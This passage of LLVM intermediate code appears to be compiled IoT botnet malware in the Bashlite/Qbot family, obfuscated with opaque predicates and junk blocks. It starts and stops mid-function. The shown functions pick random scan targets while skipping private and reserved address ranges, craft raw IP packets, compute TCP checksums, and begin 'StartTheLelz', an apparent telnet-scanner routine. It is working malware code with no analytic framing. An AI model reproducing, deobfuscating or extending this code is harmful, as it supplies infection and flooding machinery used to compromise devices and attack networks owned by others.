  %250 = phi i1 [ true, %241 ], [ true, %originalBBpart220 ], [ true, %201 ], [ true, %197 ], [ true, %originalBBpart216 ], [ true, %165 ], [ true, %153 ], [ true, %141 ], [ true, %113 ], [ true, %originalBBpart28 ], [ true, %85 ], [ true, %73 ], [ true, %originalBBpart24 ], [ %248, %245 ]
  %251 = load i32, i32* @x.51
  %252 = load i32, i32* @y.52
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %249
  %259 = load i32, i32* @x.51
  %260 = load i32, i32* @y.52
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %250, label %267, label %293

; <label>:267:                                    ; preds = %originalBBpart224
  %268 = load i32, i32* @x.51
  %269 = load i32, i32* @y.52
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %267
  %276 = call i32 @rand() #2
  %277 = srem i32 %276, 255
  %278 = trunc i32 %277 to i8
  store i8 %278, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %279 = call i32 @rand() #2
  %280 = srem i32 %279, 255
  %281 = trunc i32 %280 to i8
  store i8 %281, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %282 = call i32 @rand() #2
  %283 = srem i32 %282, 255
  %284 = trunc i32 %283 to i8
  store i8 %284, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %285 = load i32, i32* @x.51
  %286 = load i32, i32* @y.52
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart241, label %originalBB26alteredBB

originalBBpart241:                                ; preds = %originalBB26
  br label %53

; <label>:293:                                    ; preds = %originalBBpart224
  %294 = load i32, i32* @x.51
  %295 = load i32, i32* @y.52
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %293
  %302 = bitcast [16 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %302, i8 0, i64 16, i32 16, i1 false)
  %303 = getelementptr inbounds [16 x i8], [16 x i8]* %11, i32 0, i32 0
  %304 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %305 = zext i8 %304 to i32
  %306 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %307 = zext i8 %306 to i32
  %308 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %309 = zext i8 %308 to i32
  %310 = call i32 (i8*, i8*, ...) @szprintf(i8* %303, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.26, i32 0, i32 0), i32 %305, i32 %307, i32 %309)
  %311 = getelementptr inbounds [16 x i8], [16 x i8]* %11, i32 0, i32 0
  %312 = call i32 @inet_addr(i8* %311) #2
  store i32 %312, i32* %9, align 4
  %313 = load i32, i32* @x.51
  %314 = load i32, i32* @y.52
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %321

; <label>:321:                                    ; preds = %originalBBpart245, %27
  %322 = load i32, i32* %9, align 4
  ret i32 %322

originalBBalteredBB:                              ; preds = %originalBB, %0
  %323 = alloca i32, align 4
  %324 = alloca [16 x i8], align 16
  %325 = alloca [16 x i8], align 16
  %326 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %327 = zext i8 %326 to i32
  %328 = icmp sgt i32 %327, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %330 = zext i8 %329 to i32
  %331 = icmp eq i32 %330, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  %332 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %333 = zext i8 %332 to i32
  %334 = icmp eq i32 %333, 127
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  %335 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp sle i32 %336, 16
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %173
  %338 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %339 = zext i8 %338 to i32
  %340 = icmp eq i32 %339, 168
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %213
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %342 = zext i8 %341 to i32
  %343 = icmp eq i32 %342, 100
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %249
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %267
  %344 = call i32 @rand() #2
  %_ = sub i32 0, %344
  %gen = add i32 %_, 255
  %_27 = sub i32 %344, 255
  %gen28 = mul i32 %_27, 255
  %345 = srem i32 %344, 255
  %346 = trunc i32 %345 to i8
  store i8 %346, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %347 = call i32 @rand() #2
  %_29 = shl i32 %347, 255
  %348 = srem i32 %347, 255
  %349 = trunc i32 %348 to i8
  store i8 %349, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %350 = call i32 @rand() #2
  %_30 = sub i32 %350, 255
  %gen31 = mul i32 %_30, 255
  %_32 = sub i32 %350, 255
  %gen33 = mul i32 %_32, 255
  %_34 = sub i32 %350, 255
  %gen35 = mul i32 %_34, 255
  %_36 = sub i32 %350, 255
  %gen37 = mul i32 %_36, 255
  %_38 = sub i32 0, %350
  %gen39 = add i32 %_38, 255
  %351 = srem i32 %350, 255
  %352 = trunc i32 %351 to i8
  store i8 %352, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %originalBB26

originalBB43alteredBB:                            ; preds = %originalBB43, %293
  %353 = bitcast [16 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %353, i8 0, i64 16, i32 16, i1 false)
  %354 = getelementptr inbounds [16 x i8], [16 x i8]* %11, i32 0, i32 0
  %355 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %356 = zext i8 %355 to i32
  %357 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %358 = zext i8 %357 to i32
  %359 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %360 = zext i8 %359 to i32
  %361 = call i32 (i8*, i8*, ...) @szprintf(i8* %354, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.26, i32 0, i32 0), i32 %356, i32 %358, i32 %360)
  %362 = getelementptr inbounds [16 x i8], [16 x i8]* %11, i32 0, i32 0
  %363 = call i32 @inet_addr(i8* %362) #2
  store i32 %363, i32* %9, align 4
  br label %originalBB43
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = load i32, i32* @x.53
  %3 = load i32, i32* @y.54
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #13
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.53
  %23 = load i32, i32* @y.54
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #13
  %34 = load i32, i32* %30, align 4
  %_ = sub i32 0, %33
  %gen = add i32 %_, %34
  %_1 = sub i32 0, %33
  %gen2 = add i32 %_1, %34
  %_3 = sub i32 %33, %34
  %gen4 = mul i32 %_3, %34
  %_5 = sub i32 %33, %34
  %gen6 = mul i32 %_5, %34
  %_7 = sub i32 %33, %34
  %gen8 = mul i32 %_7, %34
  %_9 = sub i32 0, %33
  %gen10 = add i32 %_9, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_11 = sub i32 %38, -1
  %gen12 = mul i32 %_11, -1
  %_13 = sub i32 %38, -1
  %gen14 = mul i32 %_13, -1
  %_15 = sub i32 0, %38
  %gen16 = add i32 %_15, -1
  %_17 = sub i32 %38, -1
  %gen18 = mul i32 %_17, -1
  %_19 = sub i32 %38, -1
  %gen20 = mul i32 %_19, -1
  %39 = xor i32 %38, -1
  %_21 = sub i32 %37, %39
  %gen22 = mul i32 %_21, %39
  %_23 = sub i32 %37, %39
  %gen24 = mul i32 %_23, %39
  %_25 = sub i32 0, %37
  %gen26 = add i32 %_25, %39
  %_27 = sub i32 %37, %39
  %gen28 = mul i32 %_27, %39
  %_29 = shl i32 %37, %39
  %_30 = shl i32 %37, %39
  %40 = and i32 %37, %39
  %_31 = shl i32 %36, %40
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.55
  %4 = load i32, i32* @y.56
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.55
  %15 = load i32, i32* @y.56
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %25, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp sgt i32 %23, 1
  br i1 %24, label %25, label %34

; <label>:25:                                     ; preds = %22
  %26 = load i16*, i16** %11, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %11, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %13, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %13, align 8
  %32 = load i32, i32* %12, align 4
  %33 = sub nsw i32 %32, 2
  store i32 %33, i32* %12, align 4
  br label %22

; <label>:34:                                     ; preds = %22
  %35 = load i32, i32* %12, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %44

; <label>:37:                                     ; preds = %34
  %38 = load i16*, i16** %11, align 8
  %39 = bitcast i16* %38 to i8*
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i64
  %42 = load i64, i64* %13, align 8
  %43 = add i64 %42, %41
  store i64 %43, i64* %13, align 8
  br label %44

; <label>:44:                                     ; preds = %37, %34
  br label %45

; <label>:45:                                     ; preds = %65, %44
  %46 = load i32, i32* @x.55
  %47 = load i32, i32* @y.56
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i64, i64* %13, align 8
  %55 = lshr i64 %54, 16
  %56 = icmp ne i64 %55, 0
  %57 = load i32, i32* @x.55
  %58 = load i32, i32* @y.56
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart216, label %originalBB1alteredBB

originalBBpart216:                                ; preds = %originalBB1
  br i1 %56, label %65, label %71

; <label>:65:                                     ; preds = %originalBBpart216
  %66 = load i64, i64* %13, align 8
  %67 = and i64 %66, 65535
  %68 = load i64, i64* %13, align 8
  %69 = lshr i64 %68, 16
  %70 = add i64 %67, %69
  store i64 %70, i64* %13, align 8
  br label %45

; <label>:71:                                     ; preds = %originalBBpart216
  %72 = load i64, i64* %13, align 8
  %73 = xor i64 %72, -1
  %74 = trunc i64 %73 to i16
  ret i16 %74

originalBBalteredBB:                              ; preds = %originalBB, %2
  %75 = alloca i16*, align 8
  %76 = alloca i32, align 4
  %77 = alloca i64, align 8
  store i16* %0, i16** %75, align 8
  store i32 %1, i32* %76, align 4
  store i64 0, i64* %77, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %78 = load i64, i64* %13, align 8
  %_ = sub i64 %78, 16
  %gen = mul i64 %_, 16
  %_2 = shl i64 %78, 16
  %_3 = sub i64 %78, 16
  %gen4 = mul i64 %_3, 16
  %_5 = sub i64 %78, 16
  %gen6 = mul i64 %_5, 16
  %_7 = sub i64 %78, 16
  %gen8 = mul i64 %_7, 16
  %_9 = shl i64 %78, 16
  %_10 = sub i64 %78, 16
  %gen11 = mul i64 %_10, 16
  %_12 = sub i64 %78, 16
  %gen13 = mul i64 %_12, 16
  %_14 = shl i64 %78, 16
  %79 = lshr i64 %78, 16
  %80 = icmp ne i64 %79, 0
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.57
  %4 = load i32, i32* @y.58
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #13
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #2
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #2
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.57
  %54 = load i32, i32* @y.58
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #13
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #2
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #2
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.61
  %9 = load i32, i32* @y.62
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.61
  %19 = load i32, i32* @y.62
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* %2, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %7
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @close(i32 %28)
  store i32 0, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %38

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* @x.63
  %22 = load i32, i32* @y.64
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  %29 = load i32, i32* %1, align 4
  %30 = load i32, i32* @x.63
  %31 = load i32, i32* @y.64
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart2, %19
